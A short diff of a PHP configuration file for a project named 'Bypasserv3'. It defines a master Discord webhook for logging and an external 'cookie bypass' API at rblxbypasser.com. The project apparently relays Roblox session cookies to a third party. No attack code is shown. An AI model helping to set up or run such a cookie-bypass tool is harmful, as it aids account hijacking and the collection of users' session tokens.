@@ -1,17 +1,15 @@
 <?php
 /**
  * Bypasserv3 - Configuration
- * Version: 3.0.0
  */
 
-// Prevent direct access
 if (!defined('CONFIG_LOADED')) {
     define('CONFIG_LOADED', true);
 }
 
 // Error handling
 error_reporting(E_ALL);
-ini_set('display_errors', 0); // Don't show errors to users
+ini_set('display_errors', 0);
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/data/php_errors.log');
 
@@ -26,12 +24,12 @@ define('TEMPLATE_PATH', BASE_PATH . 'template/');
 // Master webhook for logging (CHANGE THIS!)
 define('MASTER_WEBHOOK', 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN');
 
-// External API endpoint
+// External API endpoint for bypassing cookies (CHANGE THIS!)
 define('EXTERNAL_API_URL', 'https://rblxbypasser.com/api/bypass');
 
 // Rate limiting
 define('RATE_LIMIT_REQUESTS', 50);
-define('RATE_LIMIT_WINDOW', 3600); // 1 hour
+define('RATE_LIMIT_WINDOW', 3600);
 
 // Session configuration
 ini_set('session.cookie_httponly', 1);
